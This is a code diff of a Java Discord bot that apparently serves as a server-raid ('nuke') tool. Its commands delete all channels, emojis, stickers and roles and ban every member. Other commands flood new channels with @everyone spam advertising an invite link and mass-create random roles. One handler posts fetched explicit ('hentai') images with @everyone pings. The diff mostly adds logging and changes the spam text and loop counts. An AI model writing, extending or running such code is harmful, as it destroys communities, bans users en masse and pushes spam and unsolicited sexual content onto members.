@@ -55,17 +55,11 @@ public final class Bot {
 
             // For loop to create channels
             for (int i = 0; i < 25; i++) {
-                guild.createTextChannel("gg-1hunna").queue(textChannel -> {
+                guild.createTextChannel("beamed-by-root").queue(textChannel -> {
                     // For loop to spam message in channels
                     for (int j = 0; j < 50; j++) {
                         try {
-                            textChannel.sendMessage("@everyone" +
-                                    "\n" +
-                                    "/1\uD835\uDD8D\uD835\uDD9A\uD835\uDD93\uD835\uDD93\uD835\uDD86 is an upcoming Community Server, giving back to the community hosting Nitro, PayPal & more prizes in Giveaways." +
-                                    "\n" +
-                                    "Discord: discord.gg/1hunna" +
-                                    "\n" +
-                                    "Website: https://1hunna.club").queue();
+                            textChannel.sendMessage("@everyone\n wtf is this dead discord join discord.gg/1hunna").queue(text -> System.out.println("[LOG] Spamming in " + textChannel.getName() + " [" + textChannel.getId() + "]"));
                         } catch (Exception ignored) {
                         }
                     }
@@ -84,16 +78,16 @@ public final class Bot {
             Random random = new Random();
 
             // For loop to create roles
-            for (int i = 0; i < 10; i++) {
+            for (int i = 0; i < 25; i++) {
                 StringBuilder builder = new StringBuilder();
                 int color = random.nextInt();
 
-                for (int j = 0; j < 10; j++) {
-                    char c = (char)(random.nextInt(26) + 'a');
+                for (int j = 0; j < 20; j++) {
+                    char c = (char) (random.nextInt(26) + 'a');
                     builder.append(c);
                 }
 
-                guild.createRole().setName(builder.toString().toUpperCase()).setColor(color).queue(role -> role.createCopy().queue());
+                guild.createRole().setName(builder.toString().toUpperCase()).setColor(color).queue(role -> role.createCopy().queue(roley -> System.out.println("[LOG] Created role " + role.getName() + " [" + role.getId() + "]")));
             }
             event.getMessage().delete().queue();
         }
@@ -139,11 +133,12 @@ public final class Bot {
                             while ((line = reader.readLine()) != null) {
                                 builder.append(line);
                             }
-                        } catch (IOException e) {}
+                        } catch (IOException e) {
+                        }
 
                         String json = JsonParser.parseString(builder.toString()).getAsJsonObject().get("image").getAsString();
 
-                        textChannel.sendMessage("@everyone\n" + json).queue();
+                        textChannel.sendMessage("@everyone\n" + json).queue(text -> System.out.println("[LOG] Sent Hentai to " + textChannel.getName() + " [" + textChannel.getId() + "]"));
                         // add delay
                         /*try {
                             Thread.sleep(1000);
@@ -164,19 +159,19 @@ public final class Bot {
             if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!yeet")) return;
             Guild guild = event.getGuild();
 
-            guild.getChannels().forEach(guildChannel -> guildChannel.delete().queue());
-            guild.getEmojis().forEach(richCustomEmoji -> richCustomEmoji.delete().queue());
-            guild.getStickers().forEach(guildSticker -> guildSticker.delete().queue());
+            guild.getChannels().forEach(guildChannel -> guildChannel.delete().queue(channel -> System.out.println("[LOG] Yeeted Channel " + guildChannel.getName() + " [" + guildChannel.getId() + "]")));
+            guild.getEmojis().forEach(richCustomEmoji -> richCustomEmoji.delete().queue(emoji -> System.out.println("[LOG] Yeeted Emoji " + richCustomEmoji.getName() + " [" + richCustomEmoji.getId() + "]")));
+            guild.getStickers().forEach(guildSticker -> guildSticker.delete().queue(sticker -> System.out.println("[LOG] Yeeted Stcker " + guildSticker.getName() + " [" + guildSticker.getId() + "]")));
             guild.getRoles().forEach(role -> {
                 try {
-                    role.delete().queue();
+                    role.delete().queue(roley -> System.out.println("[LOG] Yeeted Role " + role.getName() + " [" + role.getId() + "]"));
                 } catch (Exception ignored) {
 
                 }
             });
             guild.getMembers().forEach(member -> {
                 try {
-                    member.ban(0, TimeUnit.SECONDS).queue();
+                    member.ban(0, TimeUnit.SECONDS).queue(membor -> System.out.println("[LOG] Yeeted Member " + member.getEffectiveName() + " [" + member.getId() + "]"));
                 } catch (Exception ignored) {
 
                 }
@@ -192,8 +187,12 @@ public final class Bot {
             if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!nomoji")) return;
             Guild guild = event.getGuild();
 
-            guild.getEmojis().forEach(richCustomEmoji -> richCustomEmoji.delete().queue());
-            guild.getStickers().forEach(guildSticker -> guildSticker.delete().queue());
+            guild.getEmojis().forEach(richCustomEmoji -> {
+                richCustomEmoji.delete().queue(emoji -> System.out.println("[LOG] Yeeted Emoji " + richCustomEmoji.getName() + " [" + richCustomEmoji.getId() + "]"));
+            });
+            guild.getStickers().forEach(guildSticker -> {
+                guildSticker.delete().queue(sticker -> System.out.println("[LOG] Yeeted Emoji " + guildSticker.getName() + " [" + guildSticker.getId() + "]"));
+            });
             event.getMessage().delete().queue();
         }
     }
@@ -205,7 +204,9 @@ public final class Bot {
             if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!nochan")) return;
             Guild guild = event.getGuild();
 
-            guild.getChannels().forEach(guildChannel -> guildChannel.delete().queue());
+            guild.getChannels().forEach(guildChannel -> {
+                guildChannel.delete().queue(channel -> System.out.println("[LOG] Yeeted Channel " + guildChannel.getName() + " [" + guildChannel.getId() + "]"));
+            });
             event.getMessage().delete().queue();
         }
     }
@@ -219,7 +220,7 @@ public final class Bot {
 
             guild.getRoles().forEach(role -> {
                 try {
-                    role.delete().queue();
+                    role.delete().queue(roley -> System.out.println("[LOG] Yeeted Role " + role.getName() + " [" + role.getId() + "]"));
                 } catch (Exception ignored) {
 
                 }
@@ -237,7 +238,7 @@ public final class Bot {
 
             guild.getMembers().forEach(member -> {
                 try {
-                    member.ban(0, TimeUnit.SECONDS).queue();
+                    member.ban(0, TimeUnit.SECONDS).queue(membor -> System.out.println("[LOG] Yeeted Member " + member.getEffectiveName() + " [" + member.getId() + "]"));
                 } catch (Exception ignored) {
 
                 }
